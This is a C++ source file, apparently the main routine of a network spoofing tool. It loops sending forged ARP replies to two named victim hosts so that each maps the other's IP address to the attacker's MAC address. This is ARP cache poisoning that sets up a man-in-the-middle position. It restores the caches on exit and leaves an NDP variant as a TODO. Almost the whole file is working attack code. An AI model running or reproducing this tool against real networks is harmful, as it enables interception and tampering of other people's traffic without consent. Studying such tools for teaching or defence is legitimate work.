#include <cstdlib>
#include <iostream>
#include <unistd.h>
#include <signal.h>
#include "ARP_packet.h"
#include "NetworkInterface.h"
#include "SpoofArguments.h"
#include "PacketManager.h"
#include "ICMPv6_packet.h"

bool loop = true;

void interruptHandler(int sig);

int main(int argc, char **argv) {
    try {
        SpoofArguments arguments(argc, argv);
        NetworkInterface networkInterface(arguments.getInterface());
        PacketManager<ARP_packet> arpPacketManager(networkInterface, "arp");
        PacketManager<ICMPv6_packet> icmpv6PacketManager(networkInterface, "icmp6");

        signal(SIGINT, interruptHandler);
        signal(SIGTERM, interruptHandler);

        if (arguments.getProtocol() == "arp") {
            /* Perform ARP cache poison */
            while (loop) {
                ARP_packet *arpReply1 = ARP_packet::createReply(
                        networkInterface.getPhysicalAddress(),
                        arguments.getVictim2Ipv4Address(),
                        arguments.getVictim1MacAddress(),
                        arguments.getVictim1Ipv4Address()
                );
                ARP_packet *arpReply2 = ARP_packet::createReply(
                        networkInterface.getPhysicalAddress(),
                        arguments.getVictim1Ipv4Address(),
                        arguments.getVictim2MacAddress(),
                        arguments.getVictim2Ipv4Address()
                );

                arpPacketManager.send(arpReply1);
                arpPacketManager.send(arpReply2);

                delete arpReply1;
                delete arpReply2;

                usleep((__useconds_t) (arguments.getTime() * 1000));
            }

            /* Reset APR cache tables */
            ARP_packet *arpReply1 = ARP_packet::createReply(
                    arguments.getVictim2MacAddress(),
                    arguments.getVictim2Ipv4Address(),
                    arguments.getVictim1MacAddress(),
                    arguments.getVictim1Ipv4Address()
            );
            ARP_packet *arpReply2 = ARP_packet::createReply(
                    arguments.getVictim1MacAddress(),
                    arguments.getVictim1Ipv4Address(),
                    arguments.getVictim2MacAddress(),
                    arguments.getVictim2Ipv4Address()
            );

            arpPacketManager.send(arpReply1);
            arpPacketManager.send(arpReply2);

            delete arpReply1;
            delete arpReply2;
        } else {
            /* Perform NDP cache poison */
            //TODO create neighbor advertisement packet and send it
        }
    }
    catch (InvalidArgumentsException &e) {
        cerr << e.what() << endl;
        SpoofArguments::printUsage();
        return EXIT_FAILURE;
    }
    catch (exception &e) {
        cerr << e.what() << endl;
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}

void interruptHandler(int sig) {
    loop = false;
}